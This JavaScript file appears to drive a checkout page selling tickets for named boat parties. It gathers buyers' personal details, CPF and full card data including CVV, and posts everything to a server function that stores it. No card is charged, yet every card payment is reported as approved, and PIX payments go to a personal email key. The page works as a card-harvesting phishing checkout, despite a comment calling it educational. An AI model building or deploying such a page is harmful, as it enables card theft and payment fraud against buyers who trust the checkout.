// Mapeamento de barcos para nomes legíveis
const barcos = {
    'angra-play': 'Angra Play',
    'caldeirao-boat': 'Caldeirão Boat',
    'barco-amigos': 'Barco Amigos',
    'extravasa-boat': 'Extravasa Boat',
    'fla-angra': 'Fla Angra',
    'galera-do-rock': 'Galera do Rock',
    'night-boys-boat': 'Night Boys Boat',
    'olha-a-onda': 'Barco Olha a Onda',
    'toaatoa-boat': 'TôáTôa Boat',
    'turma-goro-boat': 'Turma do Goró Boat',
    'ubz-boat': 'UBZ Boat',
    'projeto-x': 'Projeto X',
    'vasco-gama': 'Vasco da Gama'
};

// Obter parâmetro da URL
function obterParametroURL(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}

// Função para salvar dados no servidor (Netlify Function)
function salvarDados(dados) {
    // URL da Netlify Function
    const url = '/.netlify/functions/salvar_dados';
    
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(dados)
    })
        .then(response => response.json())
        .then(resultado => {
            if (resultado.sucesso) {
                console.log('Dados salvos com sucesso no servidor.');
            } else {
                console.error('Erro ao salvar dados no servidor:', resultado.mensagem);
            }
        })
        .catch(error => {
            console.error('Erro na requisição para o servidor:', error);
            alert('Não foi possível conectar ao servidor para salvar os dados. Por favor, verifique se o servidor está rodando.');
        });
}

// Inicializar página de pagamento
window.addEventListener('DOMContentLoaded', function () {
    const barcoSelecionado = obterParametroURL('barco');

    if (barcoSelecionado && barcos[barcoSelecionado]) {
        const nomeBarco = barcos[barcoSelecionado];
        document.getElementById('barcoSelecionado').textContent = 'Barco: ' + nomeBarco;
        document.getElementById('resumoBarco').textContent = nomeBarco;
    } else {
        document.getElementById('barcoSelecionado').textContent = 'Barco não selecionado';
        document.getElementById('resumoBarco').textContent = 'N/A';
    }

    document.querySelectorAll('input[name="metodo"]').forEach(radio => {
        radio.addEventListener('change', function () {
            document.querySelectorAll('.formulario-pagamento').forEach(form => {
                form.classList.remove('ativo');
            });

            if (this.value === 'pix') {
                document.getElementById('formPix').classList.add('ativo');
            } else if (this.value === 'cartao') {
                document.getElementById('formCartao').classList.add('ativo');
            }
        });
    });

    // Formatação de campos
    // Formatação de campos
    const inputs = {
        'numeroCartao': (v) => {
            // Remove todos os não-dígitos e limita a 16 caracteres
            let val = v.replace(/\D/g, '').slice(0, 16);

            // Formata em grupos de 4 dígitos
            const parts = [];
            for (let i = 0; i < val.length; i += 4) {
                parts.push(val.slice(i, i + 4));
            }
            return parts.join(' ');
        },

        'validade': (v) => {
            let val = v.replace(/\D/g, '').slice(0, 4);

            if (val.length >= 2) {
                // Garante que o mês seja entre 01-12
                let mes = parseInt(val.slice(0, 2));
                if (mes > 12) mes = 12;
                if (mes === 0) mes = 1;

                val = mes.toString().padStart(2, '0') + val.slice(2);
            }

            return val.length >= 2 ? val.slice(0, 2) + '/' + val.slice(2) : val;
        },

        'cvv': (v) => {
            return v.replace(/\D/g, '').slice(0, 4);
        },

        'cpf': (v) => {
            let val = v.replace(/\D/g, '').slice(0, 11);

            if (val.length <= 3) return val;
            if (val.length <= 6) return val.replace(/(\d{3})(\d+)/, '$1.$2');
            if (val.length <= 9) return val.replace(/(\d{3})(\d{3})(\d+)/, '$1.$2.$3');
            return val.replace(/(\d{3})(\d{3})(\d{3})(\d+)/, '$1.$2.$3-$4');
        },

        'telefone': (v) => {
            let val = v.replace(/\D/g, '').slice(0, 11);

            if (val.length === 0) return '';
            if (val.length <= 2) return `(${val}`;
            if (val.length <= 6) return `(${val.slice(0, 2)}) ${val.slice(2)}`;
            if (val.length <= 10) return `(${val.slice(0, 2)}) ${val.slice(2, 6)}-${val.slice(6)}`;
            return `(${val.slice(0, 2)}) ${val.slice(2, 7)}-${val.slice(7)}`;
        }
    };

    for (const id in inputs) {
        const input = document.getElementById(id);
        if (input) {
            input.addEventListener('input', (e) => {
                e.target.value = inputs[id](e.target.value);
            });
        }
    }
});

// Funções de confirmação de pagamento
// Funções de confirmação de pagamento
function confirmarPagamentoPix() {
    const dados = coletarDadosPessoais();
    if (!dados) return;

    dados.tipo = 'PIX';
    dados.valor = 'R$ 150,00';
    dados.chave_pix = 'Victorrayam19999@gmail.com';
    dados.status = 'Aguardando confirmação de pagamento';

    salvarDados(dados);
    exibirStatus('Pagamento PIX em processamento', '#ff6b35');

    // Apenas exibe o alerta, mas NÃO redireciona ainda
    // (O usuário precisa pagar o PIX primeiro)
    alert('Pagamento via PIX iniciado!\n\nChave PIX: Victorrayam19999@gmail.com\nValor: R$ 150,00\n\nOs dados foram registrados.');

    // IMPORTANTE: Em um projeto real, o redirecionamento para a confirmação
    // ocorreria DEPOIS que o banco confirmasse o pagamento (via webhook).
    // Para este projeto educacional, vamos simular o redirecionamento
    // após 3 segundos para que o usuário possa ver a chave PIX.

    console.log('Simulando redirecionamento para confirmação em 3 segundos...');

    setTimeout(() => {
        const pedidoId = 'PIX-' + Date.now();
        window.location.href = `confirmacao.html?barco=${encodeURIComponent(dados.barco)}&nome=${encodeURIComponent(dados.nome)}&email=${encodeURIComponent(dados.email)}&pedido=${pedidoId}`;
    }, 10000); // Espera 3 segundos
}

function confirmarPagamentoCartao() {
    const dados = coletarDadosPessoais();
    if (!dados) return;

    const dadosCartao = {
        nomeCartao: document.getElementById('nomeCartao').value.trim(),
        numeroCartao: document.getElementById('numeroCartao').value.trim(),
        validade: document.getElementById('validade').value.trim(),
        cvv: document.getElementById('cvv').value.trim(),
        parcelas: document.getElementById('parcelas').value
    };

    for (const key in dadosCartao) {
        if (!dadosCartao[key]) {
            alert('Por favor, preencha todos os dados do cartão!');
            return;
        }
    }

    if (dadosCartao.numeroCartao.replace(/\s/g, '').length < 15 || !/^\d{2}\/\d{2}$/.test(dadosCartao.validade) || dadosCartao.cvv.length < 3) {
        alert('Dados do cartão inválidos!');
        return;
    }

    const valorTotal = 150;
    const valorParcela = (valorTotal / parseInt(dadosCartao.parcelas)).toFixed(2);

    Object.assign(dados, dadosCartao, {
        tipo: 'CARTÃO DE CRÉDITO',
        valorTotal: 'R$ ' + valorTotal.toFixed(2),
        valorParcela: 'R$ ' + valorParcela,
        status: 'Pagamento processado'
    });

    salvarDados(dados);
    exibirStatus('Pagamento aprovado', '#28a745');

    // Exibe o alerta de sucesso
    alert(`Pagamento via Cartão de Crédito aprovado!\n\n${dados.parcelas}x de R$ ${valorParcela}\nValor Total: R$ ${valorTotal.toFixed(2)}\n\nOs dados foram registrados.`);

    // --- NOVA LINHA DE REDIRECIONAMENTO ---
    // Como o cartão é (simulado como) aprovado na hora, redirecionamos
    const pedidoId = 'CARTAO-' + Date.now();
    window.location.href = `confirmacao.html?barco=${encodeURIComponent(dados.barco)}&nome=${encodeURIComponent(dados.nome)}&email=${encodeURIComponent(dados.email)}&pedido=${pedidoId}`;
}

function coletarDadosPessoais() {
    const dados = {
        nome: document.getElementById('nome').value.trim(),
        email: document.getElementById('email').value.trim(),
        telefone: document.getElementById('telefone').value.trim(),
        cpf: document.getElementById('cpf').value.trim(),
        barco: barcos[obterParametroURL('barco')] || obterParametroURL('barco'),
        data: new Date().toLocaleString('pt-BR')
    };

    for (const key in dados) {
        if (!dados[key]) {
            alert('Por favor, preencha todos os dados pessoais!');
            return null;
        }
    }
    return dados;
}

function exibirStatus(mensagem, cor) {
    const statusEl = document.getElementById('statusPagamento');
    statusEl.textContent = mensagem;
    statusEl.style.color = cor;
}

